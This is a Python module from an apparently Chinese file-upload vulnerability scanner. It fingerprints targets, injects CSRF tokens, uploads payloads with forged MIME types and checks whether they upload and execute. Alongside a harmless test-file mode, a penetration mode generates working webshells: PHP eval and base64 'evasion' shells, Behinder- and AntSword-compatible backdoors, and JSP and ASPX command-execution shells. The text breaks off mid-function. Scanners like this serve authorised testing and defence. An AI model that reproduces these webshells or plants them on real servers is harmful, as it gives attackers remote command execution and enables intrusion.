#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
异步扫描器 - 整合upload_forge功能
"""

import asyncio
import random
from urllib.parse import quote, urljoin
from typing import List, Optional, Callable
from datetime import datetime

from .async_http_client import AsyncHTTPClient
from .async_response_analyzer import AsyncResponseAnalyzer, ScanHttpResponse, wrap_raw_response
from .form_parser import FormParser
from .fingerprinter import (
    EnvironmentFingerprinter,
    EnvironmentProfile,
    filter_payloads_by_profile,
)
from .raw_http_client import RawHTTPClient
from .models import (
    ScanResult, VulnerabilityFinding, TrafficLog,
    RISK_CRITICAL, RISK_HIGH, RISK_MEDIUM, RISK_LOW,
    CONFIDENCE_CERTAIN, CONFIDENCE_HIGH, CONFIDENCE_MEDIUM
)


class AsyncScanner:
    """异步文件上传漏洞扫描器"""
    
    def __init__(self):
        self.analyzer = AsyncResponseAnalyzer()
        self.results = []
        self.running = False
        self.max_payloads = 1200  # 默认Payload数量限制（与GUI一致）
        # 【新增】扫描状态保存，支持继续扫描
        self._last_progress = 0  # 上次扫描到的位置
        self._saved_payloads = []  # 保存的payload列表
        self._scan_config = {}  # 保存的扫描配置
    
    async def scan(self, 
                   target_url: str, 
                   file_param: str = "file",
                   upload_dir: Optional[str] = None,
                   proxies: Optional[dict] = None,
                   headers: Optional[dict] = None,
                   cookies: Optional[str] = None,
                   on_log_callback: Optional[Callable[[str], None]] = None,
                   on_traffic_callback: Optional[Callable[[TrafficLog], None]] = None,
                   on_finding_callback: Optional[Callable[[VulnerabilityFinding], None]] = None,
                   on_result_callback: Optional[Callable[[dict], None]] = None,
                   on_traffic_update_callback: Optional[Callable[[int, bool], None]] = None,
                   max_payloads: int = 1200,
                   progress_callback: Optional[Callable[[str, int], None]] = None,
                   timeout: int = 30,
                   use_raw_multipart: bool = True,
                   use_fingerprint: bool = True,
                   selected_extensions: Optional[List[str]] = None,
                   scan_mode: str = "security",  # 【新增】security / penetration
                   webshell_config: Optional[dict] = None) -> ScanResult:  # 【新增】WebShell配置
        """执行扫描"""
        self.running = True
        start_time = datetime.now()
        if max_payloads is None:
            max_payloads = self.max_payloads
        
        if on_log_callback:
            on_log_callback("=== AsyncScanner.scan() 开始 ===")
            on_log_callback(f"参数: target_url={target_url}, file_param={file_param}")
            on_log_callback(f"max_payloads={max_payloads}, use_fingerprint={use_fingerprint}")
            on_log_callback(f"running状态: {self.running}")
        
        # 解析cookies
        cookie_dict = {}
        if cookies:
            for cookie in cookies.split(';'):
                if '=' in cookie:
                    k, v = cookie.strip().split('=', 1)
                    cookie_dict[k] = v
        
        # 创建HTTP客户端
        engine = AsyncHTTPClient(proxies=proxies, headers=headers, cookies=cookie_dict, timeout=timeout)
        engine.set_log_callback(on_traffic_callback)
        
        scan_result = ScanResult(target=target_url, start_time=start_time)
        self._traffic_cb = on_traffic_callback
        self._traffic_update_cb = on_traffic_update_callback
        self._on_result_callback = on_result_callback
        self._on_finding_callback = on_finding_callback
        self._use_raw = False
        self._raw_client: Optional[RawHTTPClient] = None
        
        upload_url = target_url
        extra_fields: Optional[dict] = None

        profile = EnvironmentProfile()
        if use_fingerprint:
            try:
                if on_log_callback:
                    on_log_callback("正在获取目标页面进行环境指纹检测...")
                
                # 添加超时保护，避免指纹检测卡住
                pre = await asyncio.wait_for(engine.get(target_url), timeout=30)
                
                if on_log_callback:
                    on_log_callback("正在分析环境指纹...")
                    
                fp = EnvironmentFingerprinter()
                profile = fp.fingerprint(target_url, pre)
                
                if on_log_callback:
                    on_log_callback(fp.get_fingerprint_summary().replace("\n", " | "))

                if on_log_callback:
                    on_log_callback("正在解析页面表单...")
                    
                try:
                    parser = FormParser(None)
                    forms = parser.find_upload_forms(target_url, pre.text)
                    
                    if on_log_callback:
                        on_log_callback(f"发现 {len(forms)} 个上传表单")
                        
                except Exception as e:
                    if on_log_callback:
                        on_log_callback(f"表单解析失败: {e}")
                    forms = []

                picked = None
                if forms:
                    # 优先选择包含当前 file_param 的表单；其次选第一个上传表单
                    for f in forms:
                        for ff in (f.get("file_fields") or []):
                            if (ff.get("name") or "").strip() == (file_param or "").strip():
                                picked = f
                                break
                        if picked:
                            break
                    if not picked:
                        picked = forms[0]

                if picked:
                    upload_url = picked.get("action") or target_url
                    ff_list = picked.get("file_fields") or []
                    if ff_list and not (file_param or "").strip():
                        file_param = (ff_list[0].get("name") or "file").strip() or "file"
                    elif ff_list and all((ff.get("name") or "").strip() != (file_param or "").strip() for ff in ff_list):
                        # 若页面只有一个 file 字段，自动修正 file_param
                        if len(ff_list) == 1:
                            file_param = (ff_list[0].get("name") or "file").strip() or "file"
                    extra_fields = dict(picked.get("other_fields") or {})
                    # 自动提取并注入 CSRF token（避免对有 CSRF 保护的目标全部 403）
                    try:
                        fp_parser = FormParser(None)
                        csrf_tokens = fp_parser.extract_csrf_token(pre.text)
                        if csrf_tokens:
                            extra_fields.update(csrf_tokens)
                            if on_log_callback:
                                on_log_callback(f"检测到 CSRF Token，已自动注入: {', '.join(csrf_tokens.keys())}")
                    except Exception:
                        pass
                    if on_log_callback and upload_url != target_url:
                        on_log_callback(f"已从页面表单推断上传接口: {upload_url}  file字段={file_param}")
                    if on_log_callback and extra_fields:
                        on_log_callback(f"表单附带字段: {', '.join(list(extra_fields.keys())[:8])}")
            except Exception as ex:
                if on_log_callback:
                    on_log_callback(f"环境指纹预检失败（使用默认策略）: {ex}")
        
        if use_raw_multipart:
            proxy_str = None
            if proxies:
                proxy_str = proxies.get("http://") or proxies.get("https://")
            try:
                self._raw_client = RawHTTPClient(timeout=timeout, proxy=proxy_str)
                self._raw_client.set_cookie(cookie_dict)
                if headers:
                    for hk, hv in headers.items():
                        self._raw_client.set_header(hk, hv)
                self._raw_client.set_header("Referer", target_url)
                self._use_raw = True
            except Exception as ex:
                if on_log_callback:
                    on_log_callback(f"Raw 客户端初始化失败，回退 httpx 上传: {ex}")
                self._raw_client = None
                self._use_raw = False
        
        if on_log_callback:
            on_log_callback("正在生成payloads...")
        raw_list = self._generate_payloads(None, selected_extensions, scan_mode, webshell_config)
        if on_log_callback:
            on_log_callback(f"生成原始payloads: {len(raw_list)} 个")
        
        if use_fingerprint:
            if on_log_callback:
                on_log_callback("正在使用指纹过滤payloads...")
            payloads = filter_payloads_by_profile(
                raw_list, profile, max_payloads, apply_disable=True, prioritize=True
            )
            if on_log_callback:
                on_log_callback(f"指纹过滤后payloads: {len(payloads)} 个")
        else:
            payloads = raw_list[:max_payloads]
            if on_log_callback:
                on_log_callback(f"直接截断payloads: {len(payloads)} 个")
        
        if on_log_callback:
            on_log_callback(
                f"本轮 Payload: {len(payloads)} 个（指纹={'开' if use_fingerprint else '关'}，"
                f"Raw上传={'开' if self._use_raw else '关'}）"
            )
        
        total = len(payloads)
        if total == 0:
            if on_log_callback:
                on_log_callback("警告: 没有可用的payloads，扫描将立即结束")
            return scan_result
        
        inferred_upload_dir = upload_dir  # 自动推断上传目录（用户未填时从响应中提取）

        if on_log_callback:
            on_log_callback(f"开始测试循环，共 {total} 个payloads")
            on_log_callback(f"第一个payload: {payloads[0].get('desc', 'unknown') if payloads else '无'}")
        
        # 发送初始进度，避免看起来卡在0%
        if progress_callback:
            progress_callback("正在初始化扫描...", 0)
        
        # 【智能后缀判定】初始化后缀统计
        ext_stats = {}  # {ext: {"success": 0, "total": 0, "max_confidence": 0.0}}
        SKIP_CONFIDENCE_THRESHOLD = 0.85  # 置信度超过此值跳过后缀其他payload
        MIN_PAYLOADS_BEFORE_SKIP = 3  # 每个后缀至少测试3个payload后再评估
        
        # 【新增】保存扫描模式配置
        self._scan_mode = scan_mode
        self._webshell_config = webshell_config or {"enabled": False}
        
        if on_log_callback:
            on_log_callback(f"[模式] 测试模式: {'渗透测试' if scan_mode == 'penetration' else '安全测试'}")
            if self._webshell_config.get("enabled"):
                on_log_callback(f"[模式] WebShell密码: {self._webshell_config.get('password', '默认')}")
                on_log_callback(f"[模式] Shell类型: {self._webshell_config.get('type', '基础')}")

        # 统计每个后缀的payload数量
        for p in payloads:
            ext = p.get('ext', 'unknown')
            if ext not in ext_stats:
                ext_stats[ext] = {"success": 0, "total": 0, "max_confidence": 0.0}
            ext_stats[ext]["total"] += 1

        # 【修复】定义进度更新间隔
        update_interval = max(1, min(5, total // 100))  # 至少每5个或每1%更新一次

        # 收集需要跳过的后缀
        skipped_exts = set()

        for i, payload in enumerate(payloads):
            if on_log_callback and i % 50 == 0:  # 每50个打印一次进度
                on_log_callback(f"测试进度: {i+1}/{total}")
            
            if not self.running:
                if on_log_callback:
                    on_log_callback(f"扫描被停止，当前进度: {i}/{total}")
                # 【修复】保存当前进度以便后续恢复
                self._last_progress = i
                break

            # 【修复】更频繁的进度更新
            current_progress = int((i + 1) / total * 100)  # 当前进度基于已完成的比例
            if progress_callback and (i == 0 or (i + 1) % update_interval == 0 or i == total - 1):
                progress_callback(f"测试 {payload.get('desc', 'unknown')} ({i+1}/{total})", current_progress)
                # 强制刷新UI
                if hasattr(progress_callback, '__self__') and hasattr(progress_callback.__self__, 'repaint'):
                    progress_callback.__self__.repaint()

            try:
                # 添加超时保护，避免单个请求卡住整个扫描
                result = await asyncio.wait_for(
                    self._test_payload(engine, upload_url, file_param, payload, inferred_upload_dir, extra_fields),
                    timeout=60  # 单个请求最多60秒
                )
                
                # 自动推断上传目录：从第一个有路径泄露的响应中提取父目录
                if result and not inferred_upload_dir:
                    leaked = result.get('path_leaked') or ''
                    if leaked and ('/' in leaked or '\\' in leaked):
                        import re as _re
                        _m = _re.match(r'(https?://[^/]+)((?:/[^/]+)*/)', leaked)
                        if _m:
                            inferred_upload_dir = _m.group(1) + _m.group(2).rstrip('/')
                        else:
                            inferred_upload_dir = leaked.rsplit('/', 1)[0] if '/' in leaked else None
                        if inferred_upload_dir and on_log_callback:
                            on_log_callback(f"自动推断上传目录: {inferred_upload_dir}")
                
                # 【智能后缀判定】更新后缀统计并检查是否需要跳过后缀
                ext = payload.get('ext', 'unknown')
                if result:
                    confidence = result.get('confidence', 0)
                    is_success = result.get('is_success', False) or result.get('is_vulnerability', False)
                    
                    if ext in ext_stats:
                        if confidence > ext_stats[ext]["max_confidence"]:
                            ext_stats[ext]["max_confidence"] = confidence
                        if is_success:
                            ext_stats[ext]["success"] += 1
                    
                    # 检查是否需要跳过后缀的其他payload
                    if ext not in skipped_exts and ext in ext_stats:
                        stats = ext_stats[ext]
                        # 只有在测试了足够多的payload后才评估
                        if stats["total"] >= MIN_PAYLOADS_BEFORE_SKIP:
                            # 计算当前后缀的成功率
                            success_count = stats["success"]
                            tested = stats["total"]
                            current_conf = stats["max_confidence"]
                            
                            # 条件：置信度超过阈值 或 有明显的成功结果
                            if current_conf >= SKIP_CONFIDENCE_THRESHOLD:
                                skipped_exts.add(ext)
                                if on_log_callback:
                                    on_log_callback(f"[智能判定] .ext 置信度已达 {current_conf:.0%}，跳过后缀其他payload")
                                if progress_callback:
                                    progress_callback(f"[智能] .ext 后缀已确认，跳过剩余测试", current_progress)
                            elif success_count >= 2:  # 有2个以上成功结果
                                skipped_exts.add(ext)
                                if on_log_callback:
                                    on_log_callback(f"[智能判定] .ext 已获 {success_count} 个成功结果，跳过后缀其他payload")
                
                        # 【修复】漏洞检查必须在这里执行，不能在 continue 之后！
                # 如果是漏洞发现
                if result and result.get('is_vulnerability'):
                    finding = result.get('finding')
                    if finding:
                        scan_result.findings.append(finding)
                        scan_result.stats["vulns_found"] += 1
                        print(f"[AsyncScanner] 发现漏洞: {finding.name}", flush=True)
                        if self._on_finding_callback:
                            self._on_finding_callback(finding)
                        if on_log_callback:
                            on_log_callback(f"[+] 发现漏洞: {finding.name}")
                
                scan_result.stats["total_requests"] += 1
                
                # 如果当前后缀已被标记为跳过，直接跳到下一个payload（漏洞检查已完成）
                if ext in skipped_exts:
                    remaining = sum(1 for p in payloads[i+1:] if p.get('ext') == ext)
                    if remaining > 0 and on_log_callback:
                        on_log_callback(f"[跳过] .ext 后缀已确认，跳过剩余 {remaining} 个payload")
                    continue
                
            except Exception as e:
                if on_log_callback:
                    on_log_callback(f"[-] 测试失败: {str(e)}")
        
        await engine.close()
        if self._raw_client:
            self._raw_client.close()
            self._raw_client = None
        self._use_raw = False
        self._traffic_cb = None
        scan_result.end_time = datetime.now()
        self.running = False
        
        if on_log_callback:
            on_log_callback("扫描完成")
        
        return scan_result
    
    async def _run_blocking(self, fn, *args):
        """在executor中运行阻塞函数"""
        loop = asyncio.get_running_loop()
        # 【修复】添加超时保护，避免永久阻塞
        try:
            result = await asyncio.wait_for(
                loop.run_in_executor(None, lambda: fn(*args)),
                timeout=30  # 最多等待30秒
            )
            return result
        except asyncio.CancelledError:
            raise
        except Exception as e:
            raise
    
    async def _test_payload(self, 
                           engine: AsyncHTTPClient, 
                           target_url: str, 
                           file_param: str, 
                           payload: dict,
                           upload_dir: Optional[str] = None,
                           extra_fields: Optional[dict] = None) -> Optional[dict]:
        """测试单个payload"""
        content = payload['content']
        # 【修复】支持MIME类型伪造：优先使用payload指定的伪造Content-Type
        content_type = payload.get('fake_content_type', 'application/octet-stream')
        
        # 处理文件名
        if payload.get('filename'):
            actual_filename = payload['filename']
        else:
            rand_suffix = str(random.randint(1000, 9999))
            actual_filename = f"test_{rand_suffix}.{payload['ext']}"
        
        # 【新增】用于保存流量日志对象，以便后续更新 is_success
        _current_log = None
        
        # 上传文件（Raw 字节级 multipart 或 httpx）
        try:
            if self._use_raw and self._raw_client:
                raw_resp = await self._run_blocking(
                    self._raw_client.upload_file,
                    target_url,
                    file_param,
                    actual_filename,
                    content,
                    content_type,
                    None,
                    None,
                    extra_fields,
                )
                _current_log = self._log_raw_traffic(
                    engine, "POST", target_url,
                    f"[field={file_param} file={actual_filename}]",
                    raw_resp,
                )
                response = wrap_raw_response(raw_resp, target_url)
            else:
                response = await engine.upload_file(
                    url=target_url,
                    file_field_name=file_param,
                    filename=actual_filename,
                    file_content=content,
                    content_type=content_type,
                    extra_data=extra_fields,
                )
        except Exception as e:
            import traceback
            traceback.print_exc()
            return None
        
        # 分析上传响应
        analysis = self.analyzer.analyze_upload_response(response, actual_filename)
        
        # 如果分析结果为None，设置默认值
        if analysis is None:
            analysis = {'is_success': False, 'success_probability': 0, 'confidence_level': 'low', 
                       'is_redirect': False, 'length': 0, 'decision_reasons': [], 'verify_filenames': [actual_filename]}
        
        followed_redirect = False
        redirect_response = None
        # 增强:安全的重定向跟进：302跳转到详情页时提取文件名
        redirect_location = response.headers.get("location", "") or response.headers.get("Location", "")
        if 300 <= response.status_code < 400 and redirect_location:
            try:
                # 只跟进一次，设置2秒超时避免卡住
                redirect_url = urljoin(target_url, redirect_location)
                redirect_response = await asyncio.wait_for(
                    engine.check_file_existence(redirect_url),
                    timeout=2.0
                )
                if redirect_response and redirect_response.status_code == 200:
                    followed_redirect = True
                    # 从跳转后的响应中提取服务端文件名
                    redirect_server_filename = self.analyzer._extract_server_filename_from_html(redirect_response.text)
                    if redirect_server_filename and redirect_server_filename != actual_filename:
                        analysis['server_filename'] = redirect_server_filename
            except:
                pass
        # 格式化请求头和响应头
        if isinstance(response, ScanHttpResponse):
            # 【修复】从 raw_request 中提取真正的 HTTP 请求头和请求体
            req_headers = ""
            req_body = ""
            if hasattr(response, 'raw_request') and response.raw_request:
                raw_req = response.raw_request
                try:
                    hdr_end = raw_req.find(b"\r\n\r\n")
                    if hdr_end != -1:
                        # 提取请求头（包括第一行请求行）
                        req_headers = raw_req[:hdr_end].decode('utf-8', errors='replace')
                        # 提取请求体
                        req_body = engine._format_request_body(raw_req[hdr_end + 4:])
                    else:
                        # 如果没有分隔符，整个内容作为请求头
                        req_headers = raw_req.decode('utf-8', errors='replace')
                except:
                    req_headers = f"POST {target_url} HTTP/1.1"
                    req_body = ""
            else:
                # 没有 raw_request 时的回退
                req_headers = f"POST {target_url} HTTP/1.1\nContent-Type: multipart/form-data"
                req_body = ""
        else:
            # 【修复】httpx.Response 类型：构建完整的 HTTP 请求（包括请求行）
            req_method = getattr(response.request, 'method', 'POST')
            req_url = str(getattr(response.request, 'url', target_url))
            # 提取路径部分（去掉 scheme 和 host）
            from urllib.parse import urlparse
            parsed = urlparse(req_url)
            req_path = parsed.path + (f"?{parsed.query}" if parsed.query else "")
            if not req_path:
                req_path = "/"
            req_line = f"{req_method} {req_path} HTTP/1.1"
            req_headers = req_line + "\n" + "\n".join([f"{k}: {v}" for k, v in response.request.headers.items()])
            # 从 httpx 请求中获取请求体
            req_body = ""
            try:
                if hasattr(response.request, 'content') and response.request.content:
                    req_body = engine._format_request_body(response.request.content)
            except:
                pass
        res_headers = "\n".join([f"{k}: {v}" for k, v in response.headers.items()])
        
        # 【修复】将相对路径转换为完整URL
        path_leaked = analysis.get('path_leaked') or ''
        if path_leaked and not path_leaked.startswith('http'):
            # 相对路径，转换为完整URL
            from urllib.parse import urljoin
            path_leaked = urljoin(target_url, path_leaked)
        
        # 构建结果字典
        result = {
            'filename': actual_filename,
            'payload_type': payload.get('type', 'unknown'),
            'description': payload.get('desc', ''),
            'status_code': response.status_code,
            'is_success': analysis['is_success'],
            'is_redirect': analysis.get('is_redirect', False),
            'success_probability': analysis['success_probability'],
            'path_leaked': path_leaked,
            'response_length': analysis['length'],
            'confidence_level': analysis.get('confidence_level', 'low'),
            'decision_reasons': analysis.get('decision_reasons', []),
            'server_filename': analysis.get('server_filename'),
            'followed_redirect': followed_redirect,
            'is_vulnerability': False,
            'finding': None,
            'request_headers': req_headers,
            'request_body': req_body,  # 添加请求体
            'response_headers': res_headers,
            'response_body': response.text  # 完整响应内容
        }
        if followed_redirect:
            extra = f"重定向跟进: {redirect_location}"
            result['decision_reasons'] = (result.get('decision_reasons', []) + [extra])[:10]
        
        # 【红队方案】验证优先：所有上传都尝试验证，仅验证成功才判定成功
        verified_execution = False
        verified_upload = False
        verification_url = None
        
        # 提取验证候选文件名
        candidates = analysis.get('verify_filenames') or [actual_filename]
        
        def _looks_like_filesystem_path(p: str) -> bool:
            low = (p or "").strip()
            if not low:
                return False
            if low.startswith("\\\\"):
                return True
            if len(low) >= 3 and low[1] == ":" and (low[2] in ("\\", "/")):
                return True
            if low.startswith("/"):
                if any(seg in low for seg in ("/var/", "/usr/", "/etc/", "/home/", "/opt/", "/tmp/")):
                    return True
            return False

        def _candidate_urls_from_leak(leak: str) -> List[str]:
            leak = (leak or "").strip()
            if not leak or _looks_like_filesystem_path(leak):
                return []
            low = leak.lower()
            last = leak.split("?")[0].split("#")[0].rstrip("/")
            last_seg = last.rsplit("/", 1)[-1] if "/" in last else last
            if not ("." in last_seg):
                return []
            matched = False
            for name in candidates:
                n = (name or "").strip().lower()
                if n and (last_seg.lower() == n or n in low):
                    matched = True
                    break
            if not matched and not any(k in low for k in ("/upload", "/uploads", "/files", "/images")):
                return []
            if low.startswith("http://") or low.startswith("https://"):
                return [leak]
            # 在函数内部导入urljoin，避免嵌套函数作用域问题
            from urllib.parse import urljoin as _urljoin
            return [_urljoin(target_url, leak)]

        verification_urls: List[str] = []
        if upload_dir:
            base = upload_dir.rstrip("/")
            for check_filename in candidates:
                if not check_filename:
                    continue
                verification_urls.append(f"{base}/{quote(check_filename, safe='/%._-')}")

        leaked = analysis.get("path_leaked") or ""
        verification_urls.extend(_candidate_urls_from_leak(leaked))
        
        # 【修复】当无路径泄露且未配置upload_dir时，尝试常见上传目录
        if not verification_urls and not leaked:
            from urllib.parse import urljoin, urlparse
            parsed = urlparse(target_url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            common_paths = ["/uploads/", "/upload/", "/files/", "/images/", "/assets/"]
            for path in common_paths:
                for check_filename in candidates:
                    if not check_filename:
                        continue
                    verification_urls.append(urljoin(base_url, f"{path}{quote(check_filename, safe='/%._-')}"))

        seen_vu = set()
        
        # 限制验证URL数量，避免过多验证请求
        max_verify_urls = min(len(verification_urls), 3)
        for idx, u in enumerate(verification_urls):
            if idx >= max_verify_urls:
                break
                
            u = (u or "").strip()
            if not u:
                continue
            if u in seen_vu:
                continue
            seen_vu.add(u)
            verification_url = u
            try:
                # 添加超时保护，避免验证请求卡住
                check_resp = await asyncio.wait_for(
                    engine.check_file_existence(verification_url),
                    timeout=3.0  # 最多等待3秒
                )
                if check_resp.status_code != 200:
                    continue

                verified_upload = True
                result['verified_upload'] = True
                result['path_leaked'] = result.get('path_leaked') or verification_url
                result['verification_url'] = verification_url
                # 【修复】设置 verification 字典供前端显示
                result['verification'] = {'verified': True, 'status': 'success'}

                if b"UploadForge_Test_Success_" in content:
                    if self.analyzer.analyze_execution_response(check_resp, "46"):
                        verified_execution = True
                        result['verified_execution'] = True
                        result['verification']['execution_confirmed'] = True

                if check_resp.content == content:
                    verified_upload = True

                break
            except:
                continue
        
        # 【修复】验证优先，但无法验证时保留高置信度分析结果
        if verified_upload:
            result['is_success'] = True
            result['success_probability'] = 100
            result['confidence_level'] = 'high'
        else:
            # 【修复】当无法验证但分析器已判定成功时，保留分析结果
            # 【修复】降低置信度阈值：从'high'改为'medium'，适应upload-labs场景
            confidence = analysis.get('confidence_level', 'low')
            is_confident = confidence in ['high', 'medium']
            
            # 【新增】upload-labs特化：只要有上传目录路径证据，即使验证失败也保留成功
            has_upload_path = (
                result.get('path_leaked') and 
                '/upload' in result.get('path_leaked', '').lower()
            )
            
            if analysis.get('is_success') and (is_confident or has_upload_path):
                # 分析器已判定成功，保留该结果
                result['is_success'] = True
                result['success_probability'] = 100
                result['confidence_level'] = 'high'
                
                if has_upload_path:
                    result['decision_reasons'].append("上传目录路径证据(验证未通过但响应确认)")
                else:
                    result['decision_reasons'].append("分析器高置信度成功(响应证据充分)")
                
                # 【BUG-1修复】分析器判定成功时，同样记录为漏洞发现
                if not result.get('is_vulnerability'):
                    leaked_path = result.get('path_leaked') or analysis.get('path_leaked') or ''
                    proof_url = leaked_path
                    if leaked_path and not leaked_path.startswith('http'):
                        from urllib.parse import urljoin
                        proof_url = urljoin(target_url, leaked_path)
                    result['is_vulnerability'] = True
                    result['finding'] = self.analyzer.create_finding(
                        name=f"任意文件上传(响应确认) ({payload.get('type', 'unknown')})",
                        description=f"上传 {payload.get('type', 'unknown')} 文件成功，响应中含文件路径证据（未HTTP访问验证）",
                        risk_level=RISK_HIGH,
                        confidence=CONFIDENCE_HIGH,
                        url=target_url,
                        payload=actual_filename,
                        proof=f"响应证据: {proof_url or leaked_path or '见响应内容'}",
                        remediation="验证文件扩展名白名单，禁止上传可执行扩展名",
                        request_data=req_headers,
                        response_data=response.text
                    )
            else:
                result['is_success'] = False
                result['success_probability'] = analysis['success_probability']
        
        # 构造发现结果
        if verified_execution:
            result['is_vulnerability'] = True
            result['finding'] = self.analyzer.create_finding(
                name=f"远程代码执行 ({payload.get('type', 'unknown')})",
                description=f"成功上传并执行 {payload.get('type', 'unknown')} 文件",
                risk_level=RISK_CRITICAL,
                confidence=CONFIDENCE_CERTAIN,
                url=target_url,
                payload=actual_filename,
                proof=f"文件可在 {verification_url} 访问并执行代码",
                remediation="验证文件扩展名白名单，禁用上传目录的执行权限",
                request_data=req_headers,
                response_data=response.text
            )
        elif verified_upload:
            result['is_vulnerability'] = True
            result['finding'] = self.analyzer.create_finding(
                name=f"任意文件上传 ({payload.get('type', 'unknown')})",
                description=f"成功上传 {payload.get('type', 'unknown')} 文件，服务器未阻止此扩展名",
                risk_level=RISK_HIGH,
                confidence=CONFIDENCE_CERTAIN,
                url=target_url,
                payload=actual_filename,
                proof=f"文件可在 {verification_url} 访问",
                remediation="验证文件扩展名白名单",
                request_data=req_headers,
                response_data=response.text
            )
        
        # 【新增】更新 TrafficLog 的 is_success 状态（用于 TrafficViewer 颜色渲染）
        if _current_log is not None:
            is_success = result.get('is_success', False)
            _current_log.is_success = is_success
            # 发送更新信号，让 TrafficViewer 刷新颜色
            if self._traffic_update_cb:
                self._traffic_update_cb(_current_log.id, is_success)
        
        # 发送结果到回调（用于实时显示）
        callback = self._on_result_callback
        if result and callback:
            try:
                callback(result)
            except Exception:
                pass
        
        return result
    
    def _log_raw_traffic(
        self,
        engine: AsyncHTTPClient,
        method: str,
        url: str,
        req_note: str,
        raw_resp,
    ) -> Optional[TrafficLog]:
        """记录流量日志，返回创建的 TrafficLog 对象"""
        if not self._traffic_cb:
            return None
        engine.request_counter += 1
        req_headers_text = ""
        req_body_text = req_note or ""
        raw_req = getattr(raw_resp, "raw_request", b"") or b""
        if raw_req:
            try:
                hdr_end = raw_req.find(b"\r\n\r\n")
                if hdr_end != -1:
                    req_headers_text = raw_req[:hdr_end].decode("latin-1", errors="replace")
                    body_bytes = raw_req[hdr_end + 4 :]
                    req_body_text = engine._format_request_body(body_bytes)
                else:
                    req_headers_text = raw_req.decode("latin-1", errors="replace")
            except Exception:
                req_headers_text = ""
        res_headers = "\n".join(f"{k}: {v}" for k, v in raw_resp.headers.items())
        res_body = engine._format_response_body(raw_resp.text, raw_resp.content)
        log = TrafficLog(
            id=engine.request_counter,
            timestamp=datetime.now().strftime("%H:%M:%S"),
            method=method,
            url=url,
            status_code=raw_resp.status_code,
            request_headers=req_headers_text,
            request_body=req_body_text,
            response_headers=res_headers,
            response_body=res_body,
        )
        self._traffic_cb(log)
        return log  # 【新增】返回 log 对象以便后续更新 is_success
    
    def _generate_harmless_content(self, lang: str, marker: str = "Test") -> bytes:
        """生成安全模式下的纯文本内容（不含任何可执行代码）"""
        from config import VERSION
        content = f"""<!--
    ================================================
    UploadRanger Security Test File
    ================================================
    This file is generated by UploadRanger v{VERSION}
    Only for security testing purposes
    
    Warning:
    - This is a harmless content file
    - No executable code is included
    - For authorized security testing only
    
    Language: {lang}
    Marker: {marker}
    ================================================
-->
<!DOCTYPE html>
<html>
<head>
    <title>UploadRanger Security Test - {lang}</title>
    <meta charset="utf-8">
</head>
<body>
    <h1>UploadRanger Security Test File</h1>
    <p>This file is generated by UploadRanger for security testing</p>
    <p>Extension: {lang}</p>
    <p>Marker: {marker}</p>
    <hr>
    <p><small>Generated by UploadRanger v{VERSION}</small></p>
</body>
</html>"""
        return content.encode('utf-8')
    
    def _generate_php_webshell(self, password: str, shell_type: str = "基础eval") -> bytes:
        """根据类型生成PHP WebShell"""
        if shell_type == "基础eval":
            return f"<?php @eval($_POST['{password}']); ?>".encode()
        elif shell_type == "Base64免杀":
            return f"<?php $c=base64_decode($_POST['{password}']);@assert($c); ?>".encode()
        elif shell_type == "冰蝎兼容":
            return f"""<?php
@session_start();
$key='{password}';
$post=file_get_contents("php://input");
if(!$post){{exit;}}
$key=md5($key);
$iv=md5(md5($key));
$post=openssl_decrypt($post,"AES-128-CBC",$key,OPENSSL_RAW_DATA,$iv);
$post=unserialize($post);
$func=$post['func'];
$param=$post['param'];
$func($param);
?>""".encode()
        elif shell_type == "蚁剑兼容":
            # 蚁剑标准一句话木马，使用默认密码 ant
            return "<?php @eval($_POST['ant']); ?>".encode()
        else:
            return f"<?php @eval($_POST['{password}']); ?>".encode()
    
    def _generate_jsp_webshell(self, password: str, shell_type: str = "基础eval") -> bytes:
        """根据类型生成JSP WebShell"""
        if shell_type == "基础eval":
            return f"""<%@ page import="java.io.*" %>
<% if(request.getParameter("{password}")!=null) {{
    String cmd=request.getParameter("{password}");
    Process p=Runtime.getRuntime().exec(cmd);
    BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
    String s;
    while((s=br.readLine())!=null){{out.println(s);}}
}} %>""".encode()
        elif shell_type == "冰蝎兼容":
            return f"""<%!
class U extends ClassLoader{{U(ClassLoader c){{super(c);}}
    public Class g(byte[] b){{return super.defineClass(b,0,b.length);}}
}}
%>
<% String cls=request.getParameter("{password}");
    if(cls!=null){{
        new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext);
    }}%>""".encode()
        elif shell_type == "蚁剑兼容":
            # 蚁剑JSP一句话木马
            return f"""<%@ page import="java.io.*" %>
<% if(request.getParameter("ant")!=null) {{
    String cmd=request.getParameter("ant");
    Process p=Runtime.getRuntime().exec(cmd);
    BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
    String s;
    while((s=br.readLine())!=null){{out.println(s);}}
}} %>""".encode()
        else:
            return f"""<%@ page import="java.io.*" %>
<% if(request.getParameter("{password}")!=null) {{
    String cmd=request.getParameter("{password}");
    Process p=Runtime.getRuntime().exec(cmd);
    BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
    String s;
    while((s=br.readLine())!=null){{out.println(s);}}
}} %>""".encode()
    
    def _generate_aspx_webshell(self, password: str, shell_type: str = "基础eval") -> bytes:
        """根据类型生成ASPX WebShell"""
        if shell_type == "基础eval":
            return f"""<%@ Page Language="C#"%>
<%if(Request["{password}"]!=null){{
    System.Diagnostics.Process p=new System.Diagnostics.Process();
    p.StartInfo.FileName=Request["{password}"];
    p.StartInfo.UseShellExecute=false;
    p.StartInfo.RedirectStandardOutput=true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}}%>""".encode()
        elif shell_type == "冰蝎兼容":
            return f"""<%@ Page Language="C#" validateRequest="false" %>
<% System.Reflection.Assembly.Load(Request.BinaryRead(Request.ContentLength)).CreateInstance("U").Equals(Request.Form["{password}"]); %>""".encode()
        elif shell_type == "蚁剑兼容":
            # 蚁剑ASPX一句话木马
            return f"""<%@ Page Language="C#"%>
<%if(Request["ant"]!=null){{
    System.Diagnostics.Process p=new System.Diagnostics.Process();
    p.StartInfo.FileName=Request["ant"];
    p.StartInfo.UseShellExecute=false;
    p.StartInfo.RedirectStandardOutput=true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}}%>""".encode()
        else:
            return f"""<%@ Page Language="C#"%>
<%if(Request["{password}"]!=null){{
